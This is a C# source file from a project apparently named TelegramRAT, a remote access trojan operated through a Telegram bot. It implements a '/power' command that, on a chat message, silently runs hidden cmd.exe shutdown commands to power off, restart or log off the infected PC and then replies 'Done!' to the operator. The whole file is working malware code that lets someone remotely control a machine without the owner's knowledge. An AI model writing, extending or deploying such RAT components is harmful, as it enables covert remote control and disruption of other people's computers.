using Telegram.Bot;
using System.Diagnostics;
using TelegramRAT.Services;

namespace TelegramRAT.Commands.System;

public class PowerCommand(ITelegramBotClient botClient, IBotNotificationService notificationService) : AbstractBotCommand
{
    public override string Command => "power";
    public override int ArgsCount => 1;
    public override string Description => "Switch PC power state. Usage:\n\n" +
    "Off - Turn PC off\n" +
    "Restart - Restart PC\n" +
    "LogOff - Log off system";
    public override string Example => "/power logoff";

    public override async Task ExecuteAsync(BotCommandModel model)
    {
        if (model.Message == null) return;

        try
        {
            switch (model.Args[0].ToLower())
            {
                case "off":
                    await botClient.SendMessage(model.Message.Chat.Id, "Done!", replyParameters: new Telegram.Bot.Types.ReplyParameters { MessageId = model.Message.MessageId });
                    StartProcess("cmd.exe", "/c shutdown /s /t 1");
                    break;

                case "restart":
                    await botClient.SendMessage(model.Message.Chat.Id, "Done!", replyParameters: new Telegram.Bot.Types.ReplyParameters { MessageId = model.Message.MessageId });
                    StartProcess("cmd.exe", "/c shutdown /r /t 1");
                    break;

                case "logoff":
                    await botClient.SendMessage(model.Message.Chat.Id, "Done!", replyParameters: new Telegram.Bot.Types.ReplyParameters { MessageId = model.Message.MessageId });
                    StartProcess("cmd.exe", "/c shutdown /l");
                    break;

                default:
                    await botClient.SendMessage(model.Message.Chat.Id, "Wrong usage, type /help power to get info about this command!", replyParameters: new Telegram.Bot.Types.ReplyParameters { MessageId = model.Message.MessageId });
                    break;
            }
        }
        catch (Exception ex)
        {
            await notificationService.ReportExceptionAsync(model.Message, ex);
        }
    }

    private void StartProcess(string fileName, string arguments)
    {
        var startInfo = new ProcessStartInfo
        {
            FileName = fileName,
            Arguments = arguments,
            CreateNoWindow = true,
            UseShellExecute = false,
            WindowStyle = ProcessWindowStyle.Hidden
        };
        Process.Start(startInfo);
    }
}
